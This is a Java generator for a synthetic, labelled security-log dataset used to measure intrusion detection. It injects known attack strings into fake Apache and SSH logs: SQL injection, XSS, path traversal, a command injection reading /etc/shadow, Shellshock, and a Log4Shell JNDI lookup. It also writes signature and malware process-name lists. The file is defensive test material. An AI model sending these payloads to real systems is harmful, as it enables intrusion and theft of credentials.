package com.cybershield.dataset;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.time.*;
import java.time.format.DateTimeFormatter;
import java.util.*;

/**
 * Reproducible generator for the bundled "enterprise-sample" dataset (seeded, so output is identical every run).
 * The files use real-world formats (Apache combined access log, OpenSSH auth.log, NetFlow-style CSV, DIMACS CNF).
 * Attack records use publicly documented payload patterns; every injected record is recorded in labels.csv
 * so detection accuracy can be measured against ground truth. All IP addresses come from the reserved
 * documentation / benchmarking ranges (RFC 5737, RFC 2544), so no real host is ever referenced.
 */
public final class DatasetGenerator {
    private static final Random R = new Random(20251010L);
    private static final LocalDateTime T0 = LocalDateTime.of(2025, 10, 10, 0, 0, 0);
    private static final DateTimeFormatter APACHE = DateTimeFormatter.ofPattern("dd/MMM/yyyy:HH:mm:ss", Locale.ENGLISH);
    private static final DateTimeFormatter SYSLOG = DateTimeFormatter.ofPattern("MMM d HH:mm:ss", Locale.ENGLISH);

    static final String[] PATHS = {"/", "/index.html", "/products?id=%d", "/category/%s", "/api/v1/items?page=%d", "/login", "/logout", "/static/app.js",
            "/static/style.css", "/images/logo.png", "/about", "/contact", "/api/v1/orders/%d", "/search?q=%s", "/cart", "/checkout", "/favicon.ico", "/blog/post-%d"};
    static final String[] WORDS = {"laptop", "router", "firewall", "camera", "monitor", "keyboard", "phone", "tablet", "server", "cable"};
    static final String[] UAS = {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.5 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148", "curl/7.88.1", "Googlebot/2.1 (+http://www.google.com/bot.html)"};
    static final String[] ATTACKER_NETS = {"203.0.113.", "198.51.100.", "192.0.2."};
    static final String[] USERS = {"alice", "bob", "carol", "deploy", "svc_backup"};

    record Labelled(LocalDateTime t, String line, String label) {}

    public static void main(String[] args) throws IOException {
        Path out = Paths.get(args.length > 0 ? args[0] : "datasets/enterprise-sample");
        Files.createDirectories(out);
        generate(out);
        System.out.println("Dataset written to " + out.toAbsolutePath());
    }

    public static void generate(Path out) throws IOException {
        List<String> labels = new ArrayList<>();
        labels.add("source,line,label");
        write(out, "access.log", accessLog(labels));
        write(out, "auth.log", authLog(labels));
        write(out, "netflow.csv", netflow(labels));
        write(out, "process_events.txt", processEvents(labels));
        write(out, "labels.csv", labels);
        write(out, "signatures.txt", SIGNATURES);
        write(out, "process_names.txt", PROCESS_NAMES);
        write(out, "rules.csv", RULES);
        write(out, "pipeline_dims.txt", PIPELINE);
        write(out, "topology.csv", TOPOLOGY);
        write(out, "assignments.csv", ASSIGN);
        write(out, "policies.cnf", POLICIES);
        write(out, "dependencies.csv", DEPS);
        write(out, "numbers.csv", NUMBERS);
    }

    private static void write(Path dir, String name, List<String> lines) throws IOException {
        Files.write(dir.resolve(name), lines, StandardCharsets.UTF_8);
    }

    static String pick(String[] a) { return a[R.nextInt(a.length)]; }
    static String clientIp() { return "198.18." + R.nextInt(8) + "." + (1 + R.nextInt(250)); }
    static String attackerIp(int pool) { return ATTACKER_NETS[pool % 3] + (10 + pool); }

    static String benignPath() {
        String p = pick(PATHS);
        if (p.contains("%d")) return String.format(p, 1 + R.nextInt(500));
        if (p.contains("%s")) return String.format(p, pick(WORDS));
        return p;
    }

    static String apache(String ip, LocalDateTime t, String method, String path, int status, int bytes, String ua) {
        return ip + " - - [" + t.format(APACHE) + " +0000] \"" + method + " " + path + " HTTP/1.1\" " + status + " " + bytes + " \"-\" \"" + ua + "\"";
    }

    private static List<String> accessLog(List<String> labels) {
        List<Labelled> rows = new ArrayList<>();
        LocalDateTime t = T0;
        for (int i = 0; i < 2800; i++) {
            t = t.plusSeconds(1 + R.nextInt(4));
            int st = R.nextInt(100) < 88 ? 200 : (R.nextBoolean() ? 304 : (R.nextBoolean() ? 404 : 302));
            rows.add(new Labelled(t, apache(clientIp(), t, R.nextInt(10) < 8 ? "GET" : "POST", benignPath(), st, 200 + R.nextInt(40000), pick(UAS)), ""));
        }
        String[][] attacks = {
                {"SQLI", "/products.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users--"},
                {"SQLI", "/search?q=%27%20OR%20%271%27%3D%271"},
                {"SQLI", "/api/v1/items?id=1%20AND%20sleep(5)--"},
                {"SQLI", "/products?id=1%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables"},
                {"XSS", "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E"},
                {"XSS", "/contact?name=%3Cimg%20src=x%20onerror=alert(1)%3E"},
                {"PATH_TRAVERSAL", "/download?file=../../../../etc/passwd"},
                {"PATH_TRAVERSAL", "/static/..%2f..%2f..%2fetc%2fpasswd"},
                {"PATH_TRAVERSAL", "/view?page=../../windows/win.ini"},
                {"COMMAND_INJECTION", "/ping?host=127.0.0.1;cat%20/etc/shadow"},
                {"COMMAND_INJECTION", "/tools?cmd=cmd.exe%20/c%20whoami"},
                {"LOG4SHELL", "/login?user=%24%7Bjndi:ldap://203.0.113.77:1389/a%7D"},
                {"WEBSHELL", "/uploads/c99.php?cmd=ls"},
                {"WEBSHELL", "/uploads/r57.php"},
                {"MALWARE", "/upload?name=mimikatz.exe"},
                {"MALWARE", "/api/run?c=powershell%20-enc%20JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA="},
                {"MALWARE", "/upload?data=X5O!P%25@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"}};
        String[][] evasive = {{"PATH_TRAVERSAL", "/static/%252e%252e%252f%252e%252e%252fetc%252fpasswd"},
                {"SQLI", "/products?id=1%2520UNION%2520SELECT%2520password"}};
        String[] scannerUas = {"sqlmap/1.7.2#stable (https://sqlmap.org)", "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001)",
                "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)", "masscan/1.3 (https://github.com/robertdavidgraham/masscan)", "WPScan v3.8.24"};
        int pool = 0;
        for (int k = 0; k < 150; k++) {
            LocalDateTime when = T0.plusSeconds(R.nextInt(2800 * 2));
            String ip = attackerIp(pool++ % 9);
            String label, line;
            int roll = R.nextInt(100);
            if (roll < 55) { String[] a = attacks[R.nextInt(attacks.length)]; label = a[0]; line = apache(ip, when, "GET", a[1], 200 + (R.nextInt(3) == 0 ? 200 : 0), 300 + R.nextInt(5000), pick(UAS)); }
            else if (roll < 75) { label = "SCANNER"; line = apache(ip, when, "GET", benignPath(), 404, 150, pick(scannerUas)); }
            else if (roll < 85) { label = "SHELLSHOCK"; line = apache(ip, when, "GET", "/cgi-bin/status", 500, 120, "() { :;}; /bin/bash -c \"id\""); }
            else if (roll < 93) { String[] a = attacks[R.nextInt(attacks.length)]; label = a[0]; line = apache(ip, when, "POST", a[1], 403, 210, pick(UAS)); }
            else { String[] a = evasive[R.nextInt(evasive.length)]; label = a[0] + "_EVASIVE"; line = apache(ip, when, "GET", a[1], 200, 400, pick(UAS)); }
            rows.add(new Labelled(when, line, label));
        }
        rows.sort(Comparator.comparing(Labelled::t));
        List<String> out = new ArrayList<>();
        for (int i = 0; i < rows.size(); i++) {
            out.add(rows.get(i).line());
            if (!rows.get(i).label().isEmpty()) labels.add("access.log," + (i + 1) + "," + rows.get(i).label());
        }
        return out;
    }

    private static List<String> authLog(List<String> labels) {
        List<Labelled> rows = new ArrayList<>();
        int pid = 1000;
        LocalDateTime t = T0;
        for (int i = 0; i < 900; i++) {
            t = t.plusSeconds(3 + R.nextInt(14));
            String u = pick(USERS), ip = "10.0." + R.nextInt(4) + "." + (2 + R.nextInt(100));
            int p = pid + R.nextInt(5000);
            String l = switch (R.nextInt(6)) {
                case 0, 1 -> "Accepted publickey for " + u + " from " + ip + " port " + (40000 + R.nextInt(20000)) + " ssh2";
                case 2 -> "pam_unix(sshd:session): session opened for user " + u + " by (uid=0)";
                case 3 -> "pam_unix(sshd:session): session closed for user " + u;
                case 4 -> "Accepted password for " + u + " from " + ip + " port " + (40000 + R.nextInt(20000)) + " ssh2";
                default -> "Failed password for " + u + " from " + ip + " port " + (40000 + R.nextInt(20000)) + " ssh2";
            };
            rows.add(new Labelled(t, SYSLOG.format(t) + " web01 sshd[" + p + "]: " + l, ""));
        }
        String[] guess = {"root", "invalid user admin", "invalid user test", "invalid user oracle", "root", "invalid user postgres"};
        for (int burst = 0; burst < 6; burst++) {
            String ip = attackerIp(burst);
            LocalDateTime start = T0.plusSeconds(600 + R.nextInt(6000));
            int tries = 12 + R.nextInt(18);
            for (int k = 0; k < tries; k++) {
                LocalDateTime when = start.plusSeconds(k * 2L + R.nextInt(2));
                String g = guess[R.nextInt(guess.length)];
                int p = 6000 + burst * 100 + k;
                String l;
                if (k % 7 == 6) l = "Invalid user " + g.replace("invalid user ", "") + " from " + ip + " port " + (30000 + k);
                else if (k == tries - 1) l = "PAM 5 more authentication failures; POSSIBLE BREAK-IN ATTEMPT!";
                else l = "Failed password for " + g + " from " + ip + " port " + (30000 + k) + " ssh2";
                rows.add(new Labelled(when, SYSLOG.format(when) + " web01 sshd[" + p + "]: " + l, "BRUTE_FORCE"));
            }
        }
        rows.sort(Comparator.comparing(Labelled::t));
        List<String> out = new ArrayList<>();
        for (int i = 0; i < rows.size(); i++) {
            out.add(rows.get(i).line());
            if (!rows.get(i).label().isEmpty()) labels.add("auth.log," + (i + 1) + "," + rows.get(i).label());
        }
        return out;
    }

    private static List<String> netflow(List<String> labels) {
        long base = T0.toEpochSecond(ZoneOffset.UTC);
        List<Object[]> rows = new ArrayList<>();
        int[] ports = {80, 443, 443, 443, 22, 53, 3306, 8080, 25, 123};
        String[] servers = {"10.0.0.10", "10.0.0.10", "10.0.0.20", "10.0.0.53", "10.0.0.25"};
        for (int i = 0; i < 5400; i++) {
            long ts = base + R.nextInt(7200);
            rows.add(new Object[]{ts, R.nextBoolean() ? clientIp() : "10.0." + R.nextInt(4) + "." + (2 + R.nextInt(100)), pick(servers), 1024 + R.nextInt(60000),
                    ports[R.nextInt(ports.length)], R.nextInt(10) < 8 ? "TCP" : "UDP", 200 + R.nextInt(90000), 2 + R.nextInt(80), R.nextInt(10) < 9 ? "SA" : "S", ""});
        }
        for (int port = 1; port <= 400; port++) rows.add(new Object[]{base + 1800 + port / 10, "203.0.113.50", "10.0.0.10", 51000 + port % 100, port, "TCP", 44, 1, "S", "PORTSCAN"});
        for (int i = 0; i < 700; i++)
            rows.add(new Object[]{base + 4200 + R.nextInt(120), ATTACKER_NETS[R.nextInt(3)] + (1 + R.nextInt(250)), "10.0.0.10", 1024 + R.nextInt(60000), 80, "TCP", 60, 1, "S", "DDOS"});
        rows.sort(Comparator.comparingLong(r -> (Long) r[0]));
        List<String> out = new ArrayList<>();
        out.add("ts,src,dst,sport,dport,proto,bytes,packets,flags");
        for (int i = 0; i < rows.size(); i++) {
            Object[] r = rows.get(i);
            out.add(r[0] + "," + r[1] + "," + r[2] + "," + r[3] + "," + r[4] + "," + r[5] + "," + r[6] + "," + r[7] + "," + r[8]);
            if (!((String) r[9]).isEmpty()) labels.add("netflow.csv," + (i + 1) + "," + r[9]);
        }
        return out;
    }

    private static List<String> processEvents(List<String> labels) {
        String[] benign = {"svchost.exe", "lsass.exe", "explorer.exe", "csrss.exe", "winlogon.exe", "services.exe", "chrome.exe", "code.exe", "teams.exe", "outlook.exe",
                "notepad.exe", "java.exe", "python.exe", "slack.exe", "firefox.exe", "powershell.exe", "conhost.exe", "taskhostw.exe", "spoolsv.exe"};
        String[] bad = {"svch0st.exe", "svhost.exe", "scvhost.exe", "lsasss.exe", "expl0rer.exe", "csrs.exe", "w1nlogon.exe", "powershel1.exe", "mimikatz.exe", "m1m1katz.exe",
                "mimikatzz.exe", "xmrig.exe", "wannacry.exe", "rubeus.exe", "sharphound.exe", "meterpreter.exe"};
        List<String[]> rows = new ArrayList<>();
        for (int i = 0; i < 700; i++) rows.add(new String[]{String.valueOf(i), "host" + (1 + R.nextInt(8)) + "," + pick(benign), ""});
        for (int k = 0; k < 48; k++) { String b = bad[k % bad.length]; rows.add(new String[]{String.valueOf(R.nextInt(700)), "host" + (1 + R.nextInt(8)) + "," + b, "SUSPICIOUS_PROCESS"}); }
        rows.sort(Comparator.comparingInt(r -> Integer.parseInt(r[0])));
        List<String> out = new ArrayList<>();
        for (int i = 0; i < rows.size(); i++) {
            out.add("2025-10-10T" + String.format("%02d:%02d", Integer.parseInt(rows.get(i)[0]) / 60 % 24, Integer.parseInt(rows.get(i)[0]) % 60) + "," + rows.get(i)[1]);
            if (!rows.get(i)[2].isEmpty()) labels.add("process_events.txt," + (i + 1) + "," + rows.get(i)[2]);
        }
        return out;
    }

    static final List<String> SIGNATURES = List.of(
            "# CATEGORY|SEVERITY|pattern   (patterns are matched after URL-decoding and lower-casing each log line)",
            "SQL_INJECTION|9|union select", "SQL_INJECTION|8|' or '1'='1", "SQL_INJECTION|8|information_schema", "SQL_INJECTION|7|sleep(", "SQL_INJECTION|7|or 1=1",
            "XSS|7|<script>", "XSS|6|onerror=", "XSS|6|javascript:",
            "PATH_TRAVERSAL|8|../../", "PATH_TRAVERSAL|8|etc/passwd", "PATH_TRAVERSAL|7|win.ini", "PATH_TRAVERSAL|7|boot.ini",
            "COMMAND_INJECTION|9|;cat ", "COMMAND_INJECTION|9|cmd.exe /c", "COMMAND_INJECTION|8|/bin/sh", "COMMAND_INJECTION|7|whoami",
            "SHELLSHOCK|10|() { :;};", "LOG4SHELL|10|${jndi:",
            "SCANNER|5|sqlmap", "SCANNER|5|nikto", "SCANNER|5|nmap scripting engine", "SCANNER|5|masscan", "SCANNER|4|wpscan", "SCANNER|4|dirbuster",
            "WEBSHELL|9|c99.php", "WEBSHELL|9|r57.php", "WEBSHELL|8|b374k",
            "MALWARE|10|mimikatz", "MALWARE|9|powershell -enc", "MALWARE|10|eicar-standard-antivirus-test-file", "MALWARE|10|meterpreter",
            "BRUTE_FORCE|8|failed password for root", "BRUTE_FORCE|8|failed password for invalid user", "BRUTE_FORCE|7|invalid user ", "BRUTE_FORCE|9|possible break-in attempt");

    static final List<String> PROCESS_NAMES = List.of(
            "# CATEGORY|name   (MALWARE = known bad, SYSTEM = legitimate names that malware likes to impersonate)",
            "MALWARE|mimikatz.exe", "MALWARE|meterpreter.exe", "MALWARE|wannacry.exe", "MALWARE|xmrig.exe", "MALWARE|rubeus.exe", "MALWARE|sharphound.exe", "MALWARE|cobaltstrike.exe",
            "SYSTEM|svchost.exe", "SYSTEM|lsass.exe", "SYSTEM|explorer.exe", "SYSTEM|csrss.exe", "SYSTEM|winlogon.exe", "SYSTEM|services.exe", "SYSTEM|spoolsv.exe",
            "SYSTEM|conhost.exe", "SYSTEM|powershell.exe", "SYSTEM|taskhostw.exe");

    static final List<String> RULES = List.of(
            "# id,name,cost,categories (| separated)",
            "R1,WAF core ruleset,40,SQL_INJECTION|XSS|PATH_TRAVERSAL|COMMAND_INJECTION", "R2,Bot and scanner blocker,15,SCANNER|WEBSHELL", "R3,EDR malware shield,60,MALWARE|WEBSHELL",
            "R4,SSH fail2ban,10,BRUTE_FORCE", "R5,Log4j and Bash virtual patch,12,LOG4SHELL|SHELLSHOCK", "R6,SQL-only filter,15,SQL_INJECTION", "R7,XSS filter,10,XSS",
            "R8,Path normaliser,8,PATH_TRAVERSAL", "R9,RCE guard,25,COMMAND_INJECTION|SHELLSHOCK", "R10,Threat-intel feed,35,SCANNER|MALWARE|BRUTE_FORCE",
            "R11,Upload scanner,18,MALWARE|WEBSHELL", "R12,Full UTM suite,150,SQL_INJECTION|XSS|PATH_TRAVERSAL|COMMAND_INJECTION|SHELLSHOCK|LOG4SHELL|SCANNER|WEBSHELL|MALWARE|BRUTE_FORCE");

    static final List<String> PIPELINE = List.of(
            "# Security-analytics pipeline expressed as a matrix chain: stage i transforms a d[i-1] x d[i] feature matrix.",
            "# names: Ingest, Parse, Enrich, Correlate, Score, Aggregate",
            "names=Ingest,Parse,Enrich,Correlate,Score,Aggregate", "dims=30,35,15,5,10,20,25");

    static final List<String> TOPOLOGY = List.of(
            "# Enterprise network: from,to,capacity(Gbps)", "#source=Internet", "#sink=SIEM",
            "Internet,Edge-FW,100", "Edge-FW,WAF,60", "Edge-FW,VPN-GW,40", "WAF,LB,50", "LB,Web1,25", "LB,Web2,25", "Web1,App,30", "Web2,App,30", "VPN-GW,Auth,20",
            "VPN-GW,App,15", "App,DB,35", "App,Auth,10", "Auth,SIEM,20", "DB,SIEM,25", "Web1,SIEM,8", "Web2,SIEM,8", "App,SIEM,15");

    static final List<String> ASSIGN = List.of(
            "# analyst,alert  (an analyst has the skill to handle the alert)",
            "Asha,A-101", "Asha,A-102", "Ben,A-101", "Ben,A-103", "Chen,A-102", "Chen,A-104", "Chen,A-105", "Divya,A-103", "Divya,A-106", "Eli,A-104", "Eli,A-107", "Farah,A-105", "Farah,A-108", "Farah,A-106", "Asha,A-108");

    static final List<String> POLICIES = List.of(
            "c CyberShield security-policy constraints, 3-SAT in DIMACS CNF format",
            "c var 1 = mfa_required", "c var 2 = vpn_only_admin", "c var 3 = legacy_ssh_password", "c var 4 = network_segmentation", "c var 5 = guest_wifi_enabled", "c var 6 = edr_on_all_hosts",
            "p cnf 6 9",
            "1 2 -3 0", "-1 3 4 0", "-3 -5 6 0", "2 4 -5 0", "-2 5 6 0", "1 -4 6 0", "-1 -2 4 0", "3 -5 -6 0", "-4 5 -6 0");

    static final List<String> DEPS = List.of(
            "# service dependency links to be covered by monitoring: a,b",
            "Gateway,Auth", "Gateway,Web", "Web,App", "App,Auth", "App,DB", "App,Cache", "Cache,DB", "DB,Backup", "Auth,LDAP", "Web,CDN", "App,Queue", "Queue,Worker", "Worker,DB", "Worker,Mailer");

    static final List<String> NUMBERS = List.of(
            "# value,label  (reference labels are established mathematical facts)",
            "2305843009213693951,prime", "1000000007,prime", "561,composite", "41041,composite", "3215031751,composite", "9223372036854775807,composite",
            "18446744073709551557,prime", "104729,prime", "825265,composite", "1373653,composite", "3825123056546413051,composite", "6700417,prime");
}
